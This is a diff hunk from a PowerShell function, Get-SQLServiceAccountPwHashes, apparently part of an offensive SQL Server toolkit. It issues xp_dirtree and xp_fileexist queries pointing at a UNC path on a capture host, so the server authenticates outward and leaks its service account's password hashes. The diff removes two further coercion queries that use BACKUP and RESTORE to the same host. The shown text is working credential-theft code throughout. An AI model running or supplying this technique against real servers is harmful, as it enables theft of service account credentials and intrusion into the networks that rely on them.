@@ -72,9 +72,7 @@ Function Get-SQLServiceAccountPwHashes {
             # Functions executable by the Public role that accept UNC paths
             Get-SQLQuery -Instance $CurrentInstance -Query "xp_dirtree '\\$CaptureIp\file'" -SuppressVerbose | out-null	
             Get-SQLQuery -Instance $CurrentInstance -Query "xp_fileexist '\\$CaptureIp\file'" -SuppressVerbose | out-null	
-            Get-SQLQuery -Instance $CurrentInstance -Query "BACKUP DATABASE TESTING TO DISK = '\\$CaptureIp\file'" -SuppressVerbose | out-null	
-            Get-SQLQuery -Instance $CurrentInstance -Query "RESTORE VERIFYONLY FROM DISK = '\\$CaptureIp\file'" -SuppressVerbose | out-null	
-     
+   
             # Sleep to give the SQL Server time to send us hashes :)
             sleep $TimeOut
  
